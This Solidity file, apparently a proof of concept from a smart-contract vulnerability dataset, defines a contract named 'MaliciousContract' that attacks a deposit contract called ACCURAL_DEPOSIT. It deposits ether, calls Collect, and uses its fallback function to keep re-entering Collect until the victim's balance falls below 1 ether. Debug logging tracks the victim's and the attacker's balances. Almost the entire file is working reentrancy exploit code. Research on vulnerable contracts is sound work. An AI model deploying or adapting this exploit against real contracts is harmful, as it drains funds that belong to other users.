pragma solidity ^0.4.19;
import "../dataset/reentrancy/0x4320e6f8c05b27ab4707cd1f6d5ce6f3e4b3a5a1.sol";
import 'hardhat/console.sol';

contract MaliciousContract{
    ACCURAL_DEPOSIT accural_deposit;
    

    constructor(address _accural_deposit) public{
        accural_deposit= ACCURAL_DEPOSIT (_accural_deposit);
    }

    function attack(uint amount)  public {
        address hackerAddress = address(this);
        console.log('A- funds hacker: %s', hackerAddress.balance);
        console.log('A- funds victim: %s', address(accural_deposit).balance);
        require(amount >= 1 ether , "Must send at least 1 ether - attack");
        console.log('STARTS ATTACK');
        accural_deposit.Collect(amount);
    }

    function deposit()  public payable{
        require(msg.value >= 1 ether, "Must add at least 1 ether");
        accural_deposit.Deposit.value(msg.value)();    
    }
    


    function() payable public {
        // Re-enter the vulnerable function if there's still balance to collect        
        address hackerAddress = address(this);
        console.log('FROM REENTRANT FUNCTION');
        console.log('VICTIM:            %s', address(accural_deposit).balance);
        console.log('HACKER             %s', hackerAddress.balance);
        //console.log('address victim: %s',address(accural_deposit) );
        if ( address(accural_deposit).balance >= 1 ether) {
            accural_deposit.Collect(1 ether);
        }
    }
}